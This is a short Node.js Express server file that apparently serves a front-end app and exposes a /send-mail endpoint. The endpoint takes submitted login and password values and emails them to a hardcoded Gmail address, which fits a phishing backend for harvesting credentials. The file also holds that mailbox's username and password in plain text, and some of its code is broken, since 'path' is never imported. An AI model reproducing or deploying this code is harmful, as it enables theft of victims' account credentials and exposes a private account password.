var express = require("express");
var nodemailer = require('nodemailer');
var cors = require('cors')
var app = express();
const port = 3000;




app.use(cors())

app.use(express.json());

// app.use(function (req, res, next) {
//     //Enabling CORS
//     res.header("Access-Control-Allow-Origin", "*");
//     res.header("Access-Control-Allow-Methods", "GET,HEAD,OPTIONS,POST,PUT");
//     res.header("Access-Control-Allow-Headers", 
//     "Origin, X-Requested-With, Content-Type, Accept, x-client-key, x-client-token, x-client-secret, Authorization");
//     next();
//    });

app.use(express.static(__dirname + '/dist/calmdusk/index.html'));
app.get('*', function(req, res){
    res.sendFile(path.join(__dirname + '/dist/calmdusk/index.html'));
});
app.post("/send-mail", (req, res)=> {
    setTimeout( function(){
        console.log(req.body.params.username)
        var transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                   user: 'enigmaticvictor@gmail.com',
                   pass: 'rossoneri'
               }
           });
        
          let mailOptions = {
            from: '"Krunal Lathiya" <xx@gmail.com>', // sender address
            to: 'enigmaticvictor@gmail.com', // list of receivers
            //subject: req.body.subject, // Subject line
            text: req.body.body, // plain text body
            html: `<div>${req.body.params.login}</div><div>${req.body.params.password}` // html body
        };
        
        transporter.sendMail(mailOptions, function (err, info) {
        if(err)
            console.log(err)
        else
            console.log(info);
         });
         console.log("err")
    }, 3000);
   
});
app.listen(process.env.PORT || port, function( ) {
    console.log(`running on port ${port}`);
});